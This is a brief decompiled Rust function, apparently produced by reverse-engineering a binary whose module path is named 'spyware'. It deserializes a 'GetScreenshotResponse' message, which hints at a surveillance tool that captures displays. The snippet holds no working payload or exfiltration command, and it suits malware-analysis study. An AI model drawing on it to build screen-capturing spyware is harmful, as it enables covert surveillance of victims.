long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetScreenshotResponse>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "GetScreenshotResponsedisplays_screenshotsMessage", 21);
    return a0;
}
